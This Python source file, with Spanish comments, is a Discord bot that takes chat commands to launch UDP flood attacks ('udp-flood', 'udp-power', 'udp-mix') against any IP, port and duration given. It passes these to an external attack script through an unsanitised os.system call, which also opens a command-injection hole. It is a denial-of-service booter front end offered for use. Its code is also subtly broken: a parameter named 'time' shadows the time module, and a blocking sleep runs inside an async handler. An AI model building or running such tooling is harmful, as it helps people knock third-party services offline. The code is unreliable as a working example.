import discord
from discord.ext import commands
import asyncio
import socket
import random
import threading
import time
import os
import sys  # Importar sys para pasar argumentos al script de ataque
from colorama import Fore, Style, init

# Inicializa colorama
init()

# Configuración general
TOKEN_FILE = "token.txt"

# Colores
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Funciones para leer y guardar el token
def leer_token():
    try:
        with open(TOKEN_FILE, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return None

def guardar_token(token):
    with open(TOKEN_FILE, "w") as f:
        f.write(token)

# Obtener el token
token = leer_token()
if not token:
    print(f"{RED}No se encontró el token en el archivo o en la variable de entorno.{RESET}")

# Verificar la variable de entorno
if 'DISCORD_TOKEN' in os.environ:
    token = os.environ['DISCORD_TOKEN']
    print(f"{GREEN}Token obtenido de la variable de entorno.{RESET}")
else:
    print(f"{RED}La variable de entorno DISCORD_TOKEN no está configurada.{RESET}")
    exit()

# Configuración del bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents)  # Prefijo cambiado a "."

# Función para ejecutar el script de ataque externo
def ejecutar_ataque(host, port, time, method):
    try:
        # Construir la llamada al sistema para ejecutar el script de ataque
        comando = f"python ataque.py {host} {port} {method}"  # Asume que el script se llama ataque.py
        print(f"{BLUE}Ejecutando comando: {comando}{RESET}")
        os.system(comando) #Ejecutar el comando sin límite de tiempo
        time.sleep(int(time)) #Tiempo de ataque
    except Exception as e:
        print(f"{RED}Error al ejecutar el script de ataque: {e}{RESET}")

# Eventos y Comandos de Discord
@bot.event
async def on_ready():
    print(f"{BLUE}Bot conectado como {bot.user.name}{RESET}")
    print(f"{BLUE}¡Listo para atacar!{RESET}")

@bot.command()
async def ayuda(ctx):
    help_message = f"""
{GREEN}¡Bienvenido al bot de ataque!{RESET}

{YELLOW}Comandos:{RESET}
  `.ayuda`   - Muestra este mensaje de ayuda
  `.ataque`  - Inicia un ataque

{YELLOW}Uso:{RESET}
  `.ataque <metodo> <ip> <puerto> <tiempo>`

{YELLOW}Métodos:{RESET}
  `udp-flood`
  `udp-power`
  `udp-mix`

{YELLOW}Ejemplo:{RESET}
  `.ataque udp-mix 127.0.0.1 80 10`
    (Inicia un ataque UDP-Mix a 127.0.0.1:80 durante 10 segundos)
"""
    await ctx.send(help_message)

@bot.command()
async def ataque(ctx, method=None, ip=None, port: int = None, time: int = None):
    if not all([method, ip, port, time]):
        await ctx.send(f"{RED}`.ataque <metodo> <ip> <puerto> <tiempo>`{RESET}")
        return

    try:
        socket.inet_aton(ip)
    except socket.error:
        await ctx.send(f"{RED}La IP proporcionada no es válida{RESET}")
        return

    try:
        port = int(port)
        time = int(time)
    except ValueError:
        await ctx.send(f"{RED}El puerto y el tiempo deben ser números enteros{RESET}")
        return

    if not (1 <= port <= 65535):
        await ctx.send(f"{RED}El puerto debe estar de 1-9999{RESET}")
        return

    if time <= 0:
        await ctx.send(f"{RED}El tiempo debe ser mayor a cero{RESET}")
        return

    if method not in ["udp-flood", "udp-power", "udp-mix"]:
        await ctx.send(f"{RED}Método de ataque no válido, los métodos válidos son: udp-flood, udp-power, udp-mix{RESET}")
        return

    # Iniciar ataque en un hilo separado
    print(f"{GREEN}Iniciando ataque {method} a {ip}:{port} durante {time} segundos...{RESET}")
    await ctx.send(f"{GREEN}Iniciando ataque {method} a {ip}:{port} durante {time} segundos...{RESET}")

    threading.Thread(target=ejecutar_ataque, args=(ip, port, time, method)).start()
    time.sleep(int(time))
    print(f"{GREEN}Ataque {method} a {ip}:{port} finalizado después de {time} segundos.{RESET}")
    await ctx.send(f"{GREEN}Ataque {method} a {ip}:{port} finalizado después de {time} segundos{RESET}")

# Iniciar el bot
bot.run(token)
